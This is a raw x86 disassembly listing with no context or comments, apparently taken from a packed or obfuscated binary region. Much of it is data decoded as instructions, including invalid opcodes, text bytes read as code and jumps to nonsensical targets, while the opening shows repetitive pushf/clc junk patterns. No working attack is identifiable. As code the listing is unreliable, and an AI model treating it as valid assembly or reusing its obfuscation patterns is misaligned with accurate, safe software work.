  41e33d:	xchg   esi,eax
  41e33e:	pushf  
  41e33f:	clc    
  41e340:	mov    ah,0x95
  41e342:	pushf  
  41e343:	clc    
  41e344:	mov    ebx,0xbaf89c95
  41e349:	xchg   ebp,eax
  41e34a:	pushf  
  41e34b:	clc    
  41e34c:	mov    ecx,0xb8f89c95
  41e351:	xchg   ebp,eax
  41e352:	pushf  
  41e353:	clc    
  41e354:	mov    edi,0xbef89c95
  41e359:	xchg   ebp,eax
  41e35a:	pushf  
  41e35b:	clc    
  41e35c:	mov    ebp,0xa6f89c95
  41e361:	xchg   ebp,eax
  41e362:	pushf  
  41e363:	clc    
  41e364:	jmp    0x41e1:0x286003f9
  41e36b:	add    BYTE PTR [eax+esi*4+0x77530042],cl
  41e372:	jbe    0x41e3c4
  41e374:	mov    dh,0x85
  41e376:	pushf  
  41e377:	clc    
  41e378:	sbb    ecx,ebp
  41e37a:	push   eax
  41e37b:	pop    es
  41e37c:	es pop es
  41e37e:	add    BYTE PTR [eax],al
  41e380:	and    al,0xe1
  41e382:	inc    ecx
  41e383:	add    BYTE PTR [ebx],bl
  41e385:	or     eax,DWORD PTR [esi+ecx*1]
	...
  41e3b8:	mov    WORD PTR [eax-0x7a49ffbe],?
  41e3be:	pushf  
  41e3bf:	clc    
  41e3c0:	addr16 pushw 0x68
  41e3c4:	addr16 push 0x67
  41e3c7:	pushw  0x6b6a
  41e3cb:	push   0x676b67
	...
  41e3d8:	es aas 
  41e3da:	inc    eax
  41e3db:	add    BYTE PTR [ebp-0x5db060b1],ah
  41e3e1:	dec    edi
  41e3e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e3e3:	dec    edi
  41e3e4:	lahf   
  41e3e5:	dec    edi
  41e3e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3e7:	dec    edi
  41e3e8:	ins    DWORD PTR es:[edi],dx
  41e3e9:	dec    esi
  41e3ea:	bound  ecx,QWORD PTR [esi+0x30]
  41e3ed:	dec    esi
  41e3ee:	add    BYTE PTR [eax],al
  41e3f0:	cdq    
  41e3f1:	dec    edi
  41e3f2:	pushf  
  41e3f3:	dec    edi
  41e3f4:	fwait
  41e3f5:	dec    edi
  41e3f6:	ins    DWORD PTR es:[edi],dx
  41e3f7:	dec    esi
  41e3f8:	bound  ecx,QWORD PTR [esi+0x30]
  41e3fb:	dec    esi
  41e3fc:	scas   eax,DWORD PTR es:[edi]
  41e3fd:	dec    edi
  41e3fe:	lods   eax,DWORD PTR ds:[esi]
  41e3ff:	dec    edi
  41e400:	lahf   
  41e401:	dec    edi
  41e402:	mov    ds:0x624e6d4f,al
  41e407:	dec    esi
  41e408:	xor    BYTE PTR [esi+0x0],cl
  41e40b:	add    BYTE PTR [ebp-0x5bb067b1],ch
  41e411:	dec    edi
  41e412:	test   eax,0xa04f934f
  41e417:	dec    edi
  41e418:	fwait
  41e419:	dec    edi
  41e41a:	xor    BYTE PTR [esi+0x0],cl
  41e41d:	add    BYTE PTR [eax],al
  41e41f:	add    BYTE PTR [eax],al
  41e421:	add    BYTE PTR [eax],al
  41e423:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  41e42a:	mov    WORD PTR [ebp-0x32734274],gs
  41e430:	mov    ebp,ds
  41e432:	mov    ebp,gs
  41e434:	mov    ebp,?
  41e436:	mov    WORD PTR ds:0x2d8c1d8c,cs
  41e43c:	mov    WORD PTR ds:0x6d8c5d8c,?
  41e442:	mov    WORD PTR [edx-0x74],?
  41e445:	jae    0x41e3d3
  41e447:	jo     0x41e3d5
  41e449:	jno    0x41e3d7
  41e44b:	jbe    0x41e3d9
  41e44d:	ja     0x41e3db
  41e44f:	je     0x41e3dd
  41e451:	jne    0x41e3df
  41e453:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  41e45a:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  41e460:	lods   al,BYTE PTR ds:[esi]
  41e461:	jge    0x41e41f
  41e463:	jge    0x41e403
  41e465:	(bad)  
  41e466:	jns    0x41e4db
  41e468:	mov    ecx,0x7d738cb1
  41e46d:	ins    DWORD PTR es:[edi],dx
  41e46e:	enter  0x9fc6,0x26
  41e472:	jb     0x41e477
  41e474:	test   eax,0xb956bb17
  41e479:	hlt    
  41e47a:	test   al,0x37
  41e47c:	test   al,0x7e
  41e47e:	fnstenv [ecx-0x6a]
  41e481:	mov    cl,0x6a
  41e483:	push   0xffffffce
  41e485:	or     BYTE PTR [edx],bl
  41e487:	xlat   BYTE PTR ds:[ebx]
  41e488:	out    dx,eax
  41e489:	add    eax,0x9321d7aa
  41e48e:	scas   al,BYTE PTR es:[edi]
  41e48f:	adc    DWORD PTR [esi],esp
  41e491:	jge    0x41e4b6
  41e493:	fidiv  WORD PTR [edi]
  41e495:	leave  
  41e496:	hlt    
  41e497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e498:	cmp    ax,0x1fc8
  41e49c:	mov    dh,cl
  41e49e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e49f:	(bad)  
  41e4a0:	and    DWORD PTR [eax],ebx
  41e4a2:	and    DWORD PTR [ecx-0x18],esi
  41e4a5:	(bad)  [ebx+0x7]
  41e4a8:	cmc    
  41e4a9:	enter  0x301a,0x40
  41e4ad:	mov    al,0x42
  41e4af:	add    BYTE PTR [ecx+0x66],dh
  41e4b2:	jp     0x41e522
  41e4b4:	sbb    bl,ah
  41e4b6:	inc    ecx
  41e4b7:	add    BYTE PTR [ebx+eiz*8+0x41],bh
  41e4bb:	add    BYTE PTR [eax],cl
  41e4bd:	in     eax,dx
  41e4be:	adc    al,BYTE PTR [edi]
  41e4c0:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  41e4c7:	ins    BYTE PTR es:[edi],dx
  41e4c8:	push   0x49657557
  41e4cd:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  41e4d3:	push   edi
  41e4d4:	ins    BYTE PTR es:[edi],dx
  41e4d5:	inc    edx
  41e4d6:	push   0x76666a73
  41e4db:	inc    edx
  41e4dc:	jo     0x41e527
  41e4de:	dec    ebp
  41e4df:	dec    ebp
  41e4e0:	pop    edx
  41e4e1:	jp     0x41e53d
  41e4e3:	jbe    0x41e52b
  41e4e5:	pop    ecx
  41e4e6:	jo     0x41e560
	...
  41e4fc:	inc    ebp
  41e4fd:	push   edx
  41e4fe:	jb     0x41e574
  41e500:	inc    esi
  41e501:	je     0x41e544
  41e503:	inc    esi
  41e504:	jae    0x41e57c
  41e506:	dec    ebx
  41e507:	gs inc edx
  41e509:	inc    bx
  41e50b:	push   ebp
  41e50c:	jno    0x41e584
  41e50e:	ja     0x41e577
  41e510:	dec    edi
  41e511:	dec    esp
  41e512:	dec    ebp
  41e513:	inc    edx
  41e514:	jno    0x41e587
  41e516:	jae    0x41e56b
  41e518:	dec    eax
  41e519:	inc    ebp
  41e51a:	inc    esp
  41e51b:	inc    esp
  41e51c:	push   ecx
  41e51d:	dec    edx
  41e51e:	ins    BYTE PTR es:[edi],dx
  41e51f:	dec    ebx
  41e520:	jbe    0x41e590
  41e522:	pop    eax
  41e523:	jbe    0x41e570
  41e525:	inc    ecx
  41e526:	fs gs jno 0x41e597
  41e52a:	push   ebx
  41e52b:	inc    ecx
  41e52c:	add    BYTE PTR [eax],al
  41e52e:	inc    ebx
  41e52f:	outs   dx,BYTE PTR ds:[esi]
  41e530:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  41e534:	push   edx
  41e535:	push   ecx
  41e536:	push   0x74000064
  41e53b:	jne    0x41e5b2
  41e53d:	ins    DWORD PTR es:[edi],dx
  41e53e:	push   ecx
  41e53f:	push   eax
  41e540:	jo     0x41e5bc
  41e542:	addr16 jo 0x41e59b
  41e545:	pop    eax
  41e546:	add    BYTE PTR [eax],al
  41e548:	push   ecx
  41e549:	pop    ecx
  41e54a:	inc    ebx
  41e54b:	inc    edx
  41e54c:	outs   dx,BYTE PTR ds:[esi]
  41e54d:	popa   
  41e54e:	imul   eax,DWORD PTR [edx+0x61],0x6b
  41e552:	jne    0x41e5c2
  41e554:	dec    ebx
  41e555:	add    BYTE PTR [ecx+0x45],bh
  41e558:	bound  ebp,QWORD PTR [ecx+0x46]
  41e55b:	dec    ecx
  41e55c:	ja     0x41e5a3
  41e55e:	dec    eax
  41e55f:	inc    ebp
  41e560:	inc    edx
  41e561:	push   ebx
  41e562:	add    BYTE PTR [eax],al
  41e564:	je     0x41e5c9
  41e566:	bound  esp,QWORD PTR [edi+0x78]
  41e569:	dec    eax
  41e56a:	bound  edx,QWORD PTR [ebx+0x43]
  41e56d:	pop    eax
  41e56e:	outs   dx,DWORD PTR ds:[esi]
  41e56f:	push   0x4355
  41e574:	inc    edi
  41e575:	gs ins BYTE PTR es:[edi],dx
  41e577:	dec    esp
  41e578:	js     0x41e5e2
  41e57a:	inc    edx
  41e57b:	js     0x41e5c3
  41e57d:	arpl   WORD PTR [eax],ax
  41e57f:	add    BYTE PTR [eax],al
  41e581:	add    BYTE PTR [eax],al
  41e583:	add    BYTE PTR [edx+0x70],cl
  41e586:	jb     0x41e600
  41e588:	outs   dx,DWORD PTR ds:[esi]
  41e589:	pop    eax
  41e58a:	dec    ebx
  41e58b:	push   esp
  41e58c:	dec    esp
  41e58d:	jns    0x41e5da
  41e58f:	js     0x41e609
  41e591:	outs   dx,BYTE PTR ds:[esi]
  41e592:	pop    ecx
  41e593:	jae    0x41e603
  41e595:	push   0x43644448
  41e59a:	arpl   WORD PTR [edx+0x55],sp
  41e59d:	push   0x42504e67
  41e5a2:	push   ebp
  41e5a3:	je     0x41e61a
  41e5a5:	addr16 dec edi
  41e5a7:	dec    esp
  41e5a8:	inc    edx
  41e5a9:	ins    DWORD PTR es:[edi],dx
  41e5aa:	inc    esi
  41e5ab:	inc    esi
  41e5ac:	inc    esi
  41e5ad:	arpl   WORD PTR [edx+0x47],bx
  41e5b0:	push   ebp
  41e5b1:	inc    ebx
  41e5b2:	popa   
  41e5b3:	push   edx
  41e5b4:	dec    esp
  41e5b5:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  41e5bc:	push   ecx
  41e5bd:	push   ebx
  41e5be:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  41e5c5:	dec    edx
  41e5c6:	jns    0x41e631
  41e5c8:	push   edx
  41e5c9:	inc    ebx
  41e5ca:	jo     0x41e641
  41e5cc:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  41e5d0:	fs push ebx
  41e5d2:	inc    ebx
  41e5d3:	push   ebp
  41e5d4:	push   eax
  41e5d5:	ja     0x41e651
  41e5d7:	jp     0x41e626
  41e5d9:	push   esi
  41e5da:	arpl   WORD PTR gs:[ecx+0x45],si
  41e5de:	dec    edx
  41e5df:	dec    esi
  41e5e0:	data16 ja 0x41e631
  41e5e3:	imul   ebp,DWORD PTR [eax+0x6e],0x76597148
  41e5ea:	dec    esp
  41e5eb:	cmp    ebx,ebp
  41e5ed:	dec    esp
  41e5ee:	lods   eax,DWORD PTR ds:[esi]
  41e5ef:	out    dx,al
  41e5f0:	mov    ebp,0xa53ddffb
  41e5f5:	js     0x41e5b0
  41e5f7:	inc    esp
  41e5f8:	addr16 ja 0x41e656
  41e5fb:	ds mov ch,0x1
  41e5fe:	add    bh,ah
  41e600:	add    DWORD PTR [eax],eax
  41e602:	add    BYTE PTR [edi],ah
  41e604:	adc    dh,ch
  41e606:	xlat   BYTE PTR ds:[ebx]
  41e607:	pop    edx
  41e608:	out    dx,al
  41e609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e60a:	int3   
  41e60b:	loope  0x41e5b9
  41e60d:	imul   edx,DWORD PTR [ebx-0x4dd1ad46],0xffffff8e
  41e614:	mov    ebp,0xf3311cc7
  41e619:	(bad)  
  41e61a:	push   ss
  41e61b:	jmp    0x1af8:0xf41ca68f
  41e622:	test   BYTE PTR [ecx],dl
  41e624:	and    esp,DWORD PTR [ebx]
  41e626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e627:	dec    ebp
  41e628:	inc    ecx
  41e629:	jae    0x41e65b
  41e62b:	in     al,dx
  41e62c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e62d:	mov    al,ds:0xe9754c4b
  41e632:	clc    
  41e633:	inc    ecx
  41e634:	mov    esi,0xcee4892a
  41e639:	pusha  
  41e63a:	xor    ecx,esi
  41e63c:	mov    ds:0xad5b8058,eax
  41e641:	and    eax,0x2f02969b
  41e646:	mov    bh,0x8a
  41e648:	or     ebx,DWORD PTR [edx]
  41e64a:	cmp    DWORD PTR [edx-0x37c87e62],ecx
  41e650:	jne    0x41e693
  41e652:	in     al,0x28
  41e654:	mov    dh,0xd2
  41e656:	pushf  
  41e657:	ds pushf 
  41e659:	xchg   ebp,eax
  41e65a:	and    eax,0x388df3d0
  41e65f:	shrd   DWORD PTR [ebp+0x46],eax,0x1e
  41e664:	pop    ss
  41e665:	or     ch,BYTE PTR [ebx]
  41e667:	daa    
  41e668:	repnz mov ch,0x3e
  41e66b:	retf   0x6de3
  41e66e:	mov    DWORD PTR [ecx-0x32],ebp
  41e671:	popa   
  41e672:	inc    edx
  41e673:	dec    edi
  41e674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e675:	inc    esp
  41e676:	add    DWORD PTR [ecx+0x2985871d],edi
  41e67c:	inc    edx
  41e67d:	test   eax,0x4853615e
  41e682:	popf   
  41e683:	adc    BYTE PTR [ebp-0x42],bh
  41e686:	and    cl,BYTE PTR [edi+eiz*1]
  41e689:	mov    eax,ds:0x4d07f3b2
  41e68e:	push   ebx
  41e68f:	mov    cl,BYTE PTR [ebx+0x40]
  41e692:	mov    gs,ecx
  41e694:	in     al,dx
  41e695:	dec    esi
  41e696:	xchg   ecx,eax
  41e697:	les    ebx,FWORD PTR fs:[edx-0x38]
  41e69b:	shl    BYTE PTR [eax],1
  41e69d:	ss out 0xe4,eax
  41e6a0:	lea    esi,[ebx-0x58]
  41e6a3:	fidivr WORD PTR [eax]
  41e6a5:	inc    ebp
  41e6a6:	sar    BYTE PTR [ebp-0x46],0x69
  41e6aa:	sub    al,0xa0
  41e6ac:	sub    DWORD PTR [eax-0x31],ebx
  41e6af:	mov    WORD PTR [bx+si+0x54],?
  41e6b3:	mov    ebx,0xe76c6c5a
  41e6b8:	ss pop ebx
  41e6ba:	cmp    ah,BYTE PTR [eax+0xc]
  41e6bd:	sar    DWORD PTR [ebx-0x7c6a86],cl
  41e6c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e6c4:	cli    
  41e6c5:	ror    edi,0xbd
  41e6c8:	add    BYTE PTR [edx+0x6b],0x68
  41e6cc:	fild   WORD PTR [edi+0x38]
  41e6cf:	stc    
  41e6d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6d1:	aad    0x35
  41e6d3:	ins    DWORD PTR es:[edi],dx
  41e6d4:	(bad)  
  41e6d6:	retf   0x6c65
  41e6d9:	daa    
  41e6da:	ins    BYTE PTR es:[edi],dx
  41e6db:	cld    
  41e6dc:	pusha  
  41e6dd:	pop    edi
  41e6de:	mul    cl
  41e6e0:	pop    edi
  41e6e1:	push   ebx
  41e6e2:	inc    edi
  41e6e3:	sti    
  41e6e4:	retf   0xb4b6
  41e6e7:	sti    
  41e6e8:	(bad)
  41e6ec:	popf   
  41e6ed:	pop    edx
  41e6ee:	cmp    DWORD PTR [edi-0x4db6205a],edx
  41e6f4:	std    
  41e6f5:	mov    esi,0x13b4dcb9
  41e6fa:	es mov esi,0x7d59c9db
  41e700:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e701:	shr    DWORD PTR [ebp-0x388a2ddf],cl
  41e707:	mov    eax,0x85d48e1d
  41e70c:	(bad)  
  41e70d:	out    0xa2,eax
  41e70f:	inc    edi
  41e710:	xor    eax,0xc091f1e5
  41e715:	pop    ecx
  41e716:	iret   
  41e717:	lods   eax,DWORD PTR ds:[esi]
  41e718:	aam    0xd8
  41e71a:	fwait
  41e71b:	(bad)  
  41e71c:	mov    edx,0x2263f9c
  41e721:	in     eax,dx
  41e722:	in     eax,dx
  41e723:	jle    0x41e6da
  41e725:	lods   al,BYTE PTR ds:[esi]
  41e726:	pop    eax
  41e727:	sub    BYTE PTR [edx],bl
  41e729:	cmp    dl,bh
  41e72b:	xchg   BYTE PTR [esi+0x66],al
  41e72e:	jnp    0x41e73c
  41e730:	mov    BYTE PTR [ebx+0xc],dh
  41e733:	scas   al,BYTE PTR es:[edi]
  41e734:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e735:	test   al,0x2e
  41e737:	push   edi
  41e738:	pop    ebx
  41e739:	add    BYTE PTR [edi],0xe8
  41e73c:	or     al,0x7e
  41e73e:	cmp    DWORD PTR [ebx+0x18a83212],ebx
  41e744:	mov    bh,0xe3
  41e746:	cmp    ch,ah
  41e748:	and    esi,ebp
  41e74a:	push   esp
  41e74b:	(bad)  
  41e74d:	lock mov edx,0x419194a9
  41e753:	popf   
  41e754:	mov    dh,0xb9
  41e756:	and    eax,0xf83ce7f8
  41e75b:	popa   
  41e75c:	or     al,0x8a
  41e75e:	cmp    al,0x25
  41e760:	in     al,dx
  41e761:	xor    bl,dl
  41e763:	push   esp
  41e764:	or     BYTE PTR [eax+0x25b7cccb],bh
  41e76a:	push   esp
  41e76b:	cs inc eax
  41e76d:	push   cs
  41e76e:	mov    BYTE PTR [edi],cl
  41e770:	push   ebp
  41e771:	dec    esp
  41e772:	xor    dl,cl
  41e774:	lods   eax,DWORD PTR ds:[esi]
  41e775:	cmp    eax,0x548eadfa
  41e77a:	mov    ds:0xfacfa6c0,eax
  41e77f:	hlt    
  41e780:	call   0x842d69bc
  41e785:	shl    ebx,1
  41e787:	inc    ebp
  41e788:	jmp    0xc44ac61e
  41e78d:	jbe    0x41e781
  41e78f:	xchg   ebx,eax
  41e790:	adc    eax,DWORD PTR [esi]
  41e792:	sar    BYTE PTR [esi-0x12],1
  41e795:	jmp    0x41e815
  41e797:	cmp    edi,DWORD PTR [edx+ecx*4+0xa41ed6f]
  41e79e:	lea    ebx,[ebx]
  41e7a0:	test   al,0xd3
  41e7a2:	pop    edi
  41e7a3:	pop    esi
  41e7a4:	or     esp,DWORD PTR [ecx+0x24aa49e1]
  41e7aa:	xchg   ebx,eax
  41e7ab:	push   0xffffffe6
  41e7ad:	and    DWORD PTR [ecx],eax
  41e7af:	ror    DWORD PTR [ecx+0x2b1b0efc],cl
  41e7b5:	stos   BYTE PTR es:[edi],al
  41e7b6:	loope  0x41e7e8
  41e7b8:	sub    al,0x0
  41e7ba:	inc    edx
  41e7bb:	and    dl,BYTE PTR [ebp+0x11]
  41e7be:	enter  0xf23e,0xc5
  41e7c2:	ss int 0x2a
  41e7c5:	mov    ebp,es
  41e7c7:	dec    eax
  41e7c8:	int    0x35
  41e7ca:	jbe    0x41e768
  41e7cc:	lods   eax,DWORD PTR ds:[esi]
  41e7cd:	sar    BYTE PTR [esi],1
  41e7cf:	test   DWORD PTR [ebp+0x5a],esp
  41e7d2:	adc    BYTE PTR [esi+ebx*2+0x25],bl
  41e7d6:	int3   
  41e7d7:	sbb    DWORD PTR ds:0x7ae39f63,esp
  41e7dd:	sbb    DWORD PTR [ebp+0x7d0af0ab],edi
  41e7e3:	hlt    
  41e7e4:	pop    eax
  41e7e5:	(bad)  
  41e7e6:	adc    al,0xfd
  41e7e8:	sub    eax,0xb22800de
  41e7ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7ee:	push   edx
  41e7ef:	mov    edi,0x7cfaff57
  41e7f4:	xlat   BYTE PTR fs:[ebx]
  41e7f6:	push   esi
  41e7f7:	div    DWORD PTR [ecx]
  41e7f9:	scas   eax,DWORD PTR es:[edi]
  41e7fa:	call   0x1e7:0x1b725
  41e801:	add    BYTE PTR [eax],al
  41e803:	dec    esi
  41e804:	in     al,dx
  41e805:	xor    esi,DWORD PTR [edx]
  41e807:	pop    ss
  41e808:	sbb    bl,BYTE PTR [bx+si]
  41e80b:	pop    esi
  41e80c:	and    BYTE PTR [edx-0x7f],ah
  41e80f:	mov    ch,0x33
  41e811:	rcr    BYTE PTR [ebx+eiz*8],0x34
  41e815:	hlt    
  41e816:	pop    edi
  41e817:	xchg   BYTE PTR [ebp-0x6f456f96],dl
  41e81d:	ja     0x41e7a5
  41e81f:	call   0xedb4:0xc72bdf7f
  41e826:	inc    ebp
  41e827:	pushf  
  41e828:	cmc    
  41e829:	xchg   ecx,edx
  41e82b:	int3   
  41e82c:	mov    edx,0xb565e471
  41e831:	outs   dx,DWORD PTR ds:[esi]
  41e832:	(bad)  
  41e833:	out    dx,eax
  41e834:	sbb    dl,0x90
  41e837:	mov    bh,0x20
  41e839:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e83a:	adc    DWORD PTR [esi-0x1674b65d],eax
  41e840:	pop    esi
  41e841:	enter  0x40b9,0x98
  41e845:	add    bl,dl
  41e847:	mov    eax,0xcc437c32
  41e84c:	mov    esp,0xaaaa9ac1
  41e851:	mov    al,0x89
  41e853:	pusha  
  41e854:	fisubr DWORD PTR [edx]
  41e856:	sub    ebp,DWORD PTR [eax]
  41e858:	sub    esp,ecx
  41e85a:	jl     0x41e83e
  41e85c:	lahf   
  41e85d:	aam    0xbc
  41e85f:	push   ds
  41e860:	adc    DWORD PTR [edx+0x154b7640],0xffffff93
  41e867:	pusha  
  41e868:	sbb    eax,0xa27e3ad2
  41e86d:	or     DWORD PTR [edi],esp
  41e86f:	mov    bl,BYTE PTR [eax]
  41e871:	stos   BYTE PTR es:[edi],al
  41e872:	sbb    BYTE PTR [esi-0x45b39bfb],0x7
  41e879:	mov    al,ds:0xb0adde3c
  41e87e:	outs   dx,DWORD PTR fs:[esi]
  41e880:	int    0xc
  41e882:	(bad)  
  41e883:	xchg   ecx,eax
  41e884:	repz jge 0x41e835
  41e887:	mov    esp,es
  41e889:	add    eax,0x1ecffb35
  41e88e:	outs   dx,BYTE PTR ds:[esi]
  41e88f:	mov    bh,0xda
  41e891:	fwait
  41e892:	retf   
  41e893:	lds    ebx,FWORD PTR [esi]
  41e895:	push   eax
  41e896:	stos   DWORD PTR es:[edi],eax
  41e897:	les    eax,FWORD PTR ds:0x3786ce7b
  41e89d:	enter  0x782b,0x29
  41e8a1:	setnp  ah
  41e8a4:	lods   al,BYTE PTR ds:[esi]
  41e8a5:	jp     0x41e8b2
  41e8a7:	clc    
  41e8a8:	retfw  0x8b51
  41e8ac:	popa   
  41e8ad:	repnz (bad) 
  41e8af:	sub    DWORD PTR [edx],ecx
  41e8b1:	fs sub eax,0x4865d84d
  41e8b7:	addr16 xchg edi,esi
  41e8ba:	mov    DWORD PTR [edi-0x4f],ebp
  41e8bd:	inc    eax
  41e8be:	aaa    
  41e8bf:	hlt    
  41e8c0:	jge    0x41e8e5
  41e8c2:	mov    bl,0xda
  41e8c4:	(bad)  
  41e8c5:	sub    DWORD PTR [ebx-0x4c],ebx
  41e8c8:	dec    ebx
  41e8c9:	add    al,0xc0
  41e8cc:	mov    dl,0x6e
  41e8ce:	pop    esi
  41e8cf:	dec    eax
  41e8d0:	aaa    
  41e8d1:	and    ecx,DWORD PTR [esi-0x37]
  41e8d4:	sahf   
  41e8d5:	sbb    ah,BYTE PTR [ebp+eax*8-0x13f7b6b]
  41e8dc:	adc    ch,BYTE PTR [ebp-0x330120b0]
  41e8e2:	push   esi
  41e8e3:	inc    esi
  41e8e4:	aam    0x2c
  41e8e6:	mov    ebp,0x2bfe3083
  41e8eb:	and    cl,dl
  41e8ed:	cmp    BYTE PTR [ecx+0x5557c61a],0x50
  41e8f4:	jo     0x41e8e4
  41e8f6:	aaa    
  41e8f7:	jp     0x41e885
  41e8f9:	(bad)  
  41e8fa:	jp     0x41e895
  41e8fc:	cmp    dl,bh
  41e8fe:	sbb    esp,DWORD PTR [edi-0x4f]
  41e901:	test   al,0x5a
  41e903:	addr16 test eax,0x11cc5c0c
  41e909:	imul   edi,DWORD PTR [esi+ebp*8-0x657c944e],0xa5d66c
  41e914:	ja     0x41e94c
  41e916:	jae    0x41e95d
  41e918:	jp     0x41e8b7
  41e91a:	sbb    BYTE PTR [eax+0x75],cl
  41e91d:	sub    cl,BYTE PTR [ebx+0xf]
  41e920:	adc    dh,BYTE PTR [ecx+0x5934d462]
  41e926:	xchg   ecx,eax
  41e927:	dec    ecx
  41e928:	test   BYTE PTR [eax-0x40],0x29
  41e92c:	stos   BYTE PTR es:[edi],al
  41e92d:	xchg   esp,eax
  41e92e:	sub    eax,0x4b83318a
  41e933:	lock xchg edx,edx
  41e936:	cmp    ebp,DWORD PTR [ebx-0x47]
  41e939:	dec    eax
  41e93a:	sub    al,0x8c
  41e93c:	sti    
  41e93d:	ins    BYTE PTR es:[edi],dx
  41e93e:	int3   
  41e93f:	pop    esi
  41e940:	jbe    0x41e953
  41e942:	cmp    DWORD PTR [ebx],ebx
  41e944:	jge    0x41e99d
  41e946:	or     dh,0x63
  41e949:	jbe    0x41e9ca
  41e94b:	rcl    DWORD PTR ds:0xcb0ae536,1
  41e951:	push   edx
  41e952:	adc    DWORD PTR [edx],0xffffffd0
  41e955:	fucompp 
  41e957:	shl    BYTE PTR [ecx+eiz*2-0x7ea9ffcd],0x4a
  41e95f:	sub    DWORD PTR [esi],0x4c
  41e962:	add    ah,0x20
  41e965:	push   esp
  41e966:	cmp    DWORD PTR [edi],ecx
  41e968:	retf   0x7e8e
  41e96b:	cs mov esi,0xc5037421
  41e971:	lds    ebx,FWORD PTR [ebp+0x4d]
  41e974:	jns    0x41e95d
  41e976:	xchg   ebp,eax
  41e977:	fs out 0xff,al
  41e97a:	sbb    ebx,DWORD PTR [edx-0x7af6daab]
  41e980:	rcr    BYTE PTR [esi+0x23],cl
  41e983:	(bad)
  41e987:	je     0x41ea08
  41e989:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  41e98b:	dec    edx
  41e98c:	test   al,0xcd
  41e98e:	cmp    DWORD PTR ds:0x5034897c,esp
  41e994:	daa    
  41e995:	dec    edx
  41e996:	push   ss
  41e997:	icebp  
  41e998:	xor    edi,DWORD PTR [esi-0x75116233]
  41e99e:	inc    ecx
  41e99f:	mov    ds:0x4c7c4dd8,eax
  41e9a4:	pop    esp
  41e9a5:	xor    eax,0x20ab2dcb
  41e9aa:	pop    ebx
  41e9ab:	fisttp QWORD PTR [ebx]
  41e9ad:	dec    eax
  41e9ae:	int    0xa4
  41e9b0:	xchg   edx,eax
  41e9b1:	inc    ebx
  41e9b2:	push   ebp
  41e9b3:	jns    0x41ea30
  41e9b5:	sbb    al,0xa0
  41e9b7:	mov    esp,0x28d754ef
  41e9bc:	jb     0x41e982
  41e9be:	jno    0x41ea31
  41e9c0:	xchg   ebx,eax
  41e9c1:	pop    ss
  41e9c2:	out    0xe3,eax
  41e9c4:	lds    edx,FWORD PTR [eax-0x38]
  41e9c7:	call   0xfc12:0x1a2431f5
  41e9ce:	push   esp
  41e9cf:	in     al,0xcd
  41e9d1:	dec    edi
  41e9d2:	shl    BYTE PTR [ecx-0x24],1
  41e9d5:	xor    eax,0x3482ca24
  41e9da:	pop    ecx
  41e9db:	(bad)  
  41e9dc:	xchg   edx,eax
  41e9dd:	mov    al,ds:0x58df42d3
  41e9e2:	xor    ebx,DWORD PTR [esi+edi*1+0x4c]
  41e9e6:	test   BYTE PTR [edx-0x4cffcef0],0x55
  41e9ed:	jg     0x41e970
  41e9ef:	jmp    FWORD PTR [ebx-0x69418801]
  41e9f5:	push   0x70f60d57
  41e9fa:	dec    esi
  41e9fb:	or     al,0xb9
  41e9fd:	add    DWORD PTR [eax],eax
  41e9ff:	out    0x1,eax
  41ea01:	add    BYTE PTR [eax],al
  41ea03:	popf   
  41ea04:	loop   0x41e996
  41ea06:	add    esi,0x3e
  41ea09:	sub    esp,DWORD PTR [ebx+esi*8-0x3f55bc50]
  41ea10:	pop    edx
  41ea11:	pop    edx
  41ea12:	hlt    
  41ea13:	inc    esp
  41ea14:	int    0x32
  41ea16:	mov    dh,0x49
  41ea18:	daa    
  41ea19:	xor    al,0xd9
  41ea1b:	leave  
  41ea1c:	xchg   ebp,eax
  41ea1d:	sbb    ch,BYTE PTR [edx]
  41ea1f:	push   ss
  41ea20:	mov    ds:0x7ae0269,eax
  41ea25:	mov    ah,0x9f
  41ea27:	push   esi
  41ea28:	fiadd  WORD PTR [eax+0x334f11e6]
  41ea2e:	push   ds
  41ea2f:	inc    ebx
  41ea30:	or     ecx,ecx
  41ea32:	fcmove st,st(2)
  41ea34:	movhps xmm5,QWORD PTR [esi-0x1f]
  41ea38:	leave  
  41ea39:	in     al,dx
  41ea3a:	dec    edx
  41ea3b:	dec    eax
  41ea3c:	fld1   
  41ea3e:	div    BYTE PTR [edx-0x49853693]
  41ea44:	sbb    eax,0x667efe90
  41ea49:	scas   al,BYTE PTR es:[edi]
  41ea4a:	push   ecx
  41ea4b:	lods   eax,DWORD PTR ds:[esi]
  41ea4c:	jb     0x41ea32
  41ea4e:	ror    BYTE PTR [eax-0x10dfc02f],cl
  41ea54:	gs dec esi
  41ea56:	sub    BYTE PTR [edx+0x33fa8a8e],bh
  41ea5c:	out    dx,al
  41ea5d:	lods   eax,DWORD PTR ds:[esi]
  41ea5e:	cmp    eax,0xed4a12d9
  41ea63:	pop    ebp
  41ea64:	sub    eax,0xb47dc89a
  41ea69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea6a:	ins    DWORD PTR es:[edi],dx
  41ea6b:	call   0xbde7b6b9
